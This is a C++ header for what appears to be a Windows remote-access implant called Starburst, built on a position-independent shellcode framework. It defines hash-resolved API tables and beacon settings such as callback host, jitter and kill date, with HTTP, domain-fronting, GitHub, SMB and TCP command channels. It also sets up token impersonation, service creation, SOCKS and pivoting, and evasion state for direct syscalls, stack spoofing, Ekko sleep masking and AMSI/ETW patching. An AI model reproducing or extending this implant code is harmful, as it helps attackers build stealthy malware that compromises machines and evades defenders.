#ifndef STARBURST_COMMON_H
#define STARBURST_COMMON_H

#include <windows.h>
#include <aclapi.h>
#include <bcrypt.h>
#include <type_traits>
#include <concepts>

#include <constexpr.h>
#include <macros.h>
#include <memory.h>
#include <native.h>
#include <resolve.h>
#include <config.h>

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
#include <evasion/spoof.h>
#endif

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
#include <winhttp.h>
#endif

#if defined( GITHUB_TRANSPORT )
#include <wininet.h>
#endif

extern "C" auto RipData() -> uintptr_t;
extern "C" auto RipStart() -> uintptr_t;

#if defined( DEBUG )
#define DBG_PRINTF( format, ... ) { ntdll.DbgPrint( symbol<PCH>( "[STARBURST::%s::%d] " format ), symbol<PCH>( __FUNCTION__ ), __LINE__, ##__VA_ARGS__ ); }
#define DBG_PRINT( inst_ref, format, ... ) { (inst_ref).ntdll.DbgPrint( symbol<PCH>( "[STARBURST::%s::%d] " format ), symbol<PCH>( __FUNCTION__ ), __LINE__, ##__VA_ARGS__ ); }
#else
#define DBG_PRINTF( format, ... ) { ; }
#define DBG_PRINT( inst_ref, format, ... ) { ; }
#endif

#ifdef _M_X64
#define END_OFFSET 0x10
#else
#define END_OFFSET 0x10
#endif

namespace stardust
{
    template <typename T>
    inline T symbol(T s) {
        return reinterpret_cast<T>(
            reinterpret_cast<uintptr_t>(RipData()) -
            (reinterpret_cast<uintptr_t>(&RipData) - reinterpret_cast<uintptr_t>(s))
        );
    }

    class instance {

    public:

        struct {
            uintptr_t address;
            uintptr_t length;
        } base = {};

        struct {
            uintptr_t handle;

            struct {
                D_API( LoadLibraryA )
                D_API( GetProcAddress )
                D_API( VirtualAlloc )
                D_API( VirtualFree )
                D_API( Sleep )
                D_API( CreateProcessW )
                D_API( CreatePipe )
                D_API( ReadFile )
                D_API( WriteFile )
                D_API( CloseHandle )
                D_API( GetCurrentDirectoryW )
                D_API( SetCurrentDirectoryW )
                D_API( FindFirstFileW )
                D_API( FindNextFileW )
                D_API( FindClose )
                D_API( GetFileSizeEx )
                D_API( CreateFileW )
                D_API( DeleteFileW )
                D_API( GetCurrentProcessId )
                D_API( GetComputerNameW )
                D_API( MultiByteToWideChar )
                D_API( WideCharToMultiByte )
                D_API( lstrlenA )
                D_API( lstrlenW )
                D_API( WaitForSingleObject )
                D_API( TerminateProcess )
                D_API( GetLastError )
                D_API( GetModuleFileNameW )
                D_API( SetFilePointer )
                D_API( GetEnvironmentVariableW )
                D_API( GetTickCount )
                D_API( SetEndOfFile )
                D_API( CreateNamedPipeA )
                D_API( ConnectNamedPipe )
                D_API( PeekNamedPipe )
                D_API( CreateFileA )
                D_API( DisconnectNamedPipe )
                D_API( CreateThread )
                D_API( CreateDirectoryW )
                D_API( RemoveDirectoryW )
                D_API( CopyFileW )
                D_API( MoveFileW )
                D_API( GetEnvironmentStringsW )
                D_API( FreeEnvironmentStringsW )
                D_API( OpenProcess )
                D_API( VirtualProtect )
                D_API( GetFileAttributesW )
                D_API( TerminateThread )
                D_API( GetExitCodeThread )
            };
        } kernel32 = {
            RESOLVE_TYPE( LoadLibraryA ),
            RESOLVE_TYPE( GetProcAddress ),
            RESOLVE_TYPE( VirtualAlloc ),
            RESOLVE_TYPE( VirtualFree ),
            RESOLVE_TYPE( Sleep ),
            RESOLVE_TYPE( CreateProcessW ),
            RESOLVE_TYPE( CreatePipe ),
            RESOLVE_TYPE( ReadFile ),
            RESOLVE_TYPE( WriteFile ),
            RESOLVE_TYPE( CloseHandle ),
            RESOLVE_TYPE( GetCurrentDirectoryW ),
            RESOLVE_TYPE( SetCurrentDirectoryW ),
            RESOLVE_TYPE( FindFirstFileW ),
            RESOLVE_TYPE( FindNextFileW ),
            RESOLVE_TYPE( FindClose ),
            RESOLVE_TYPE( GetFileSizeEx ),
            RESOLVE_TYPE( CreateFileW ),
            RESOLVE_TYPE( DeleteFileW ),
            RESOLVE_TYPE( GetCurrentProcessId ),
            RESOLVE_TYPE( GetComputerNameW ),
            RESOLVE_TYPE( MultiByteToWideChar ),
            RESOLVE_TYPE( WideCharToMultiByte ),
            RESOLVE_TYPE( lstrlenA ),
            RESOLVE_TYPE( lstrlenW ),
            RESOLVE_TYPE( WaitForSingleObject ),
            RESOLVE_TYPE( TerminateProcess ),
            RESOLVE_TYPE( GetLastError ),
            RESOLVE_TYPE( GetModuleFileNameW ),
            RESOLVE_TYPE( SetFilePointer ),
            RESOLVE_TYPE( GetEnvironmentVariableW ),
            RESOLVE_TYPE( GetTickCount ),
            RESOLVE_TYPE( SetEndOfFile ),
            RESOLVE_TYPE( CreateNamedPipeA ),
            RESOLVE_TYPE( ConnectNamedPipe ),
            RESOLVE_TYPE( PeekNamedPipe ),
            RESOLVE_TYPE( CreateFileA ),
            RESOLVE_TYPE( DisconnectNamedPipe ),
            RESOLVE_TYPE( CreateThread ),
            RESOLVE_TYPE( CreateDirectoryW ),
            RESOLVE_TYPE( RemoveDirectoryW ),
            RESOLVE_TYPE( CopyFileW ),
            RESOLVE_TYPE( MoveFileW ),
            RESOLVE_TYPE( GetEnvironmentStringsW ),
            RESOLVE_TYPE( FreeEnvironmentStringsW ),
            RESOLVE_TYPE( OpenProcess ),
            RESOLVE_TYPE( VirtualProtect ),
            RESOLVE_TYPE( GetFileAttributesW ),
            RESOLVE_TYPE( TerminateThread ),
            RESOLVE_TYPE( GetExitCodeThread )
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( RtlAllocateHeap )
                D_API( RtlFreeHeap )
                D_API( RtlReAllocateHeap )
                D_API( NtQuerySystemInformation )
                D_API( NtDelayExecution )
                D_API( RtlRandomEx )
#ifdef DEBUG
                D_API( DbgPrint )
#endif
            };
        } ntdll = {
            RESOLVE_TYPE( RtlAllocateHeap ),
            RESOLVE_TYPE( RtlFreeHeap ),
            RESOLVE_TYPE( RtlReAllocateHeap ),
            RESOLVE_TYPE( NtQuerySystemInformation ),
            RESOLVE_TYPE( NtDelayExecution ),
            RESOLVE_TYPE( RtlRandomEx ),
#ifdef DEBUG
            RESOLVE_TYPE( DbgPrint )
#endif
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( GetUserNameW )
                D_API( OpenProcessToken )
                D_API( GetTokenInformation )
                D_API( LookupAccountSidW )
                D_API( AllocateAndInitializeSid )
                D_API( SetEntriesInAclA )
                D_API( FreeSid )
                D_API( InitializeSecurityDescriptor )
                D_API( SetSecurityDescriptorDacl )
                D_API( SetSecurityDescriptorSacl )
                D_API( RegOpenKeyExA )
                D_API( RegQueryValueExA )
                D_API( RegEnumKeyExA )
                D_API( RegCloseKey )
                D_API( RegSetValueExA )
                D_API( RegCreateKeyExA )
                D_API( LogonUserW )
                D_API( ImpersonateLoggedOnUser )
                D_API( DuplicateTokenEx )
                D_API( RevertToSelf )
                D_API( LookupPrivilegeNameW )
                D_API( AdjustTokenPrivileges )
                D_API( LookupPrivilegeValueW )
                D_API( OpenSCManagerW )
                D_API( OpenServiceW )
                D_API( QueryServiceConfigW )
                D_API( ChangeServiceConfigW )
                D_API( StartServiceW )
                D_API( CreateServiceW )
                D_API( DeleteService )
                D_API( CloseServiceHandle )
            };
        } advapi32 = {
            RESOLVE_TYPE( GetUserNameW ),
            RESOLVE_TYPE( OpenProcessToken ),
            RESOLVE_TYPE( GetTokenInformation ),
            RESOLVE_TYPE( LookupAccountSidW ),
            RESOLVE_TYPE( AllocateAndInitializeSid ),
            RESOLVE_TYPE( SetEntriesInAclA ),
            RESOLVE_TYPE( FreeSid ),
            RESOLVE_TYPE( InitializeSecurityDescriptor ),
            RESOLVE_TYPE( SetSecurityDescriptorDacl ),
            RESOLVE_TYPE( SetSecurityDescriptorSacl ),
            RESOLVE_TYPE( RegOpenKeyExA ),
            RESOLVE_TYPE( RegQueryValueExA ),
            RESOLVE_TYPE( RegEnumKeyExA ),
            RESOLVE_TYPE( RegCloseKey ),
            RESOLVE_TYPE( RegSetValueExA ),
            RESOLVE_TYPE( RegCreateKeyExA ),
            RESOLVE_TYPE( LogonUserW ),
            RESOLVE_TYPE( ImpersonateLoggedOnUser ),
            RESOLVE_TYPE( DuplicateTokenEx ),
            RESOLVE_TYPE( RevertToSelf ),
            RESOLVE_TYPE( LookupPrivilegeNameW ),
            RESOLVE_TYPE( AdjustTokenPrivileges ),
            RESOLVE_TYPE( LookupPrivilegeValueW ),
            RESOLVE_TYPE( OpenSCManagerW ),
            RESOLVE_TYPE( OpenServiceW ),
            RESOLVE_TYPE( QueryServiceConfigW ),
            RESOLVE_TYPE( ChangeServiceConfigW ),
            RESOLVE_TYPE( StartServiceW ),
            RESOLVE_TYPE( CreateServiceW ),
            RESOLVE_TYPE( DeleteService ),
            RESOLVE_TYPE( CloseServiceHandle )
        };

        struct {
            uintptr_t handle;

            struct {
                D_API( BCryptOpenAlgorithmProvider )
                D_API( BCryptCloseAlgorithmProvider )
                D_API( BCryptGenerateSymmetricKey )
                D_API( BCryptEncrypt )
                D_API( BCryptDecrypt )
                D_API( BCryptDestroyKey )
                D_API( BCryptCreateHash )
                D_API( BCryptHashData )
                D_API( BCryptFinishHash )
                D_API( BCryptDestroyHash )
                D_API( BCryptGenRandom )
                D_API( BCryptSetProperty )
                D_API( BCryptGetProperty )
            };
        } bcrypt_mod = {
            RESOLVE_TYPE( BCryptOpenAlgorithmProvider ),
            RESOLVE_TYPE( BCryptCloseAlgorithmProvider ),
            RESOLVE_TYPE( BCryptGenerateSymmetricKey ),
            RESOLVE_TYPE( BCryptEncrypt ),
            RESOLVE_TYPE( BCryptDecrypt ),
            RESOLVE_TYPE( BCryptDestroyKey ),
            RESOLVE_TYPE( BCryptCreateHash ),
            RESOLVE_TYPE( BCryptHashData ),
            RESOLVE_TYPE( BCryptFinishHash ),
            RESOLVE_TYPE( BCryptDestroyHash ),
            RESOLVE_TYPE( BCryptGenRandom ),
            RESOLVE_TYPE( BCryptSetProperty ),
            RESOLVE_TYPE( BCryptGetProperty )
        };

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
        struct {
            uintptr_t handle;

            struct {
                D_API( WinHttpOpen )
                D_API( WinHttpConnect )
                D_API( WinHttpOpenRequest )
                D_API( WinHttpSendRequest )
                D_API( WinHttpReceiveResponse )
                D_API( WinHttpQueryDataAvailable )
                D_API( WinHttpReadData )
                D_API( WinHttpCloseHandle )
                D_API( WinHttpSetOption )
                D_API( WinHttpAddRequestHeaders )
                D_API( WinHttpQueryHeaders )
            };
        } winhttp = {
            RESOLVE_TYPE( WinHttpOpen ),
            RESOLVE_TYPE( WinHttpConnect ),
            RESOLVE_TYPE( WinHttpOpenRequest ),
            RESOLVE_TYPE( WinHttpSendRequest ),
            RESOLVE_TYPE( WinHttpReceiveResponse ),
            RESOLVE_TYPE( WinHttpQueryDataAvailable ),
            RESOLVE_TYPE( WinHttpReadData ),
            RESOLVE_TYPE( WinHttpCloseHandle ),
            RESOLVE_TYPE( WinHttpSetOption ),
            RESOLVE_TYPE( WinHttpAddRequestHeaders ),
            RESOLVE_TYPE( WinHttpQueryHeaders )
        };
#endif

#if defined( GITHUB_TRANSPORT )
        struct {
            uintptr_t handle;

            struct {
                D_API( InternetOpenA )
                D_API( InternetConnectA )
                D_API( HttpOpenRequestA )
                D_API( HttpSendRequestA )
                D_API( HttpAddRequestHeadersA )
                D_API( InternetReadFile )
                D_API( InternetCloseHandle )
                D_API( HttpQueryInfoA )
                D_API( InternetSetOptionA )
            };
        } wininet = {
            RESOLVE_TYPE( InternetOpenA ),
            RESOLVE_TYPE( InternetConnectA ),
            RESOLVE_TYPE( HttpOpenRequestA ),
            RESOLVE_TYPE( HttpSendRequestA ),
            RESOLVE_TYPE( HttpAddRequestHeadersA ),
            RESOLVE_TYPE( InternetReadFile ),
            RESOLVE_TYPE( InternetCloseHandle ),
            RESOLVE_TYPE( HttpQueryInfoA ),
            RESOLVE_TYPE( InternetSetOptionA )
        };
#endif

        struct {
            char     uuid[37];
            char     payload_uuid[37];
            uint8_t  aes_key[32];
            uint32_t sleep_ms;
            uint32_t jitter_pct;
            uint32_t killdate;
            bool     checked_in;
            bool     running;
            HANDLE   impersonated_token;
        } agent = {};

        struct {
            char     callback_host[256];
            uint32_t callback_port;
            bool     use_ssl;
            char     user_agent[256];
            char     get_uri[128];
            char     post_uri[128];
            char     query_param[32];
            bool     proxy_enabled;
            char     proxy_host[256];
            uint32_t proxy_port;
            char     proxy_user[64];
            char     proxy_pass[64];
#if defined( HTTPX_TRANSPORT )
            char     domain_front[256];
            char     custom_headers[1024];
            uint32_t custom_headers_len;
#endif
#if defined( GITHUB_TRANSPORT )
            char     github_pat[256];
            char     github_owner[128];
            char     github_repo[128];
            uint32_t server_issue;
            uint32_t client_issue;
#endif
#if defined( SMB_TRANSPORT )
            char     pipename[256];
            uint32_t smb_id;
#endif
        } transport = {};

#if defined( HTTP_TRANSPORT ) || defined( HTTPX_TRANSPORT )
        HINTERNET h_session;
        HINTERNET h_connect;
#endif

#if defined( SMB_TRANSPORT )
        HANDLE h_pipe;
#endif

#if defined( TCP_TRANSPORT )
        uintptr_t tcp_listen_sock;
        uintptr_t tcp_client_sock;
#endif

        struct SmbLink {
            char      task_uuid[37];
            uint32_t  link_id;
            char*     agent_id;
            char*     pipe_name;
            HANDLE    h_pipe;
            bool      connected;
            SmbLink*  next;
        };
        SmbLink* smb_links;

#if defined( INCLUDE_CMD_CONNECT ) || defined( INCLUDE_CMD_DISCONNECT ) || defined( TCP_TRANSPORT )
        struct TcpLink {
            char      task_uuid[37];
            uint32_t  link_id;
            char*     agent_id;
            char*     hostname;
            uint16_t  port;
            uintptr_t socket;
            bool      connected;
            TcpLink*  next;
        };
        TcpLink* tcp_links;
        void*    tcp_link_state;
#endif

#ifdef INCLUDE_CMD_SOCKS
        void* socks_state;
#endif
#ifdef INCLUDE_CMD_SSH
        void* ssh_state;
#endif
#ifdef INCLUDE_CMD_RPFWD
        void* rpfwd_state;
#endif
#ifdef INCLUDE_CMD_BROWSERPIVOT
        void* browserpivot_state;
#endif

        struct {
            BCRYPT_ALG_HANDLE h_aes;
            BCRYPT_ALG_HANDLE h_sha256;
        } crypto = {};

        struct {
            uint8_t* buffer;
            uint32_t length;
            uint32_t capacity;
        } response_queue = {};

        struct PendingDownload {
            char      task_uuid[37];
            HANDLE    h_file;
            uint8_t*  mem_buf;
            uint32_t  total_size;
            uint32_t  total_chunks;
            bool      is_mem;
            bool      active;
        };

        static constexpr uint32_t MAX_PENDING_DOWNLOADS = 4;

        struct {
            PendingDownload entries[MAX_PENDING_DOWNLOADS];
        } downloads = {};

        struct JobEntry {
            char      task_uuid[37];
            uint8_t   cmd_id;
            HANDLE    h_thread;
            bool      active;
        };

        static constexpr uint32_t MAX_JOBS = 16;

        struct {
            JobEntry  entries[MAX_JOBS];
            uint32_t  count;
        } jobs = {};

        struct {
            struct {
                uint32_t hash;
                uint16_t ssn;
                void*    trampoline;
            } syscall_table[16] = {};
            uint32_t syscall_count = 0;

            void*    saved_ret_addr = nullptr;
            void*    saved_rbp = nullptr;
            uint8_t  frame_backup[64] = {};
            bool     stack_spoofed = false;

            struct {
                uint8_t  rc4_key[16];
                uintptr_t img_base;
                uint32_t  img_size;
                DWORD     old_protect;
                bool      initialized;
            } ekko = {};

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
            SPOOF_STATE spoof = {};
#endif

#if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
            bool amsi_patched = false;
            void* amsi_veh    = nullptr;
#endif
#ifdef INCLUDE_EVASION_ETW
            bool etw_patched  = false;
#endif
        } evasion = {};

        struct {
            char     x64[260];
            char     x86[260];
            char     x64_args[260];
            char     x86_args[260];
        } spawnto = {};

        struct {
            char*    output_data;
            uint32_t output_length;
            uint32_t output_capacity;
        } coff = {};

#ifdef INCLUDE_CMD_POWERPICK
        struct {
            HANDLE pipe_read;
            HANDLE pipe_write;
            bool   stdout_redirected;
        } powerpick = {};
#endif

        explicit instance();

        auto start(
            _In_ void* arg
        ) -> void;

        auto declfn parse_config() -> bool;
        auto declfn do_checkin() -> bool;
        auto declfn beacon_loop() -> void;
        auto declfn dispatch_task(
            _In_ uint8_t  cmd_id,
            _In_ char*    task_uuid,
            _In_ uint8_t* params,
            _In_ uint32_t params_len
        ) -> void;

        auto declfn heap_alloc( uint32_t size ) -> void*;
        auto declfn heap_realloc( void* ptr, uint32_t size ) -> void*;
        auto declfn heap_free( void* ptr ) -> void;

        auto declfn sleep_with_jitter() -> void;
    };

    template<typename T = char>
    inline auto declfn hash_string(
        _In_ const T* string
    ) -> uint32_t {
        uint32_t hash = 0x811c9dc5;
        uint8_t  byte = 0;

        while ( * string ) {
            byte = static_cast<uint8_t>( * string++ );

            if ( byte >= 'a' ) {
                byte -= 0x20;
            }

            hash ^= byte;
            hash *= 0x01000193;
        }

        return hash;
    }
}

namespace starburst {
    using stardust::instance;
}


#endif
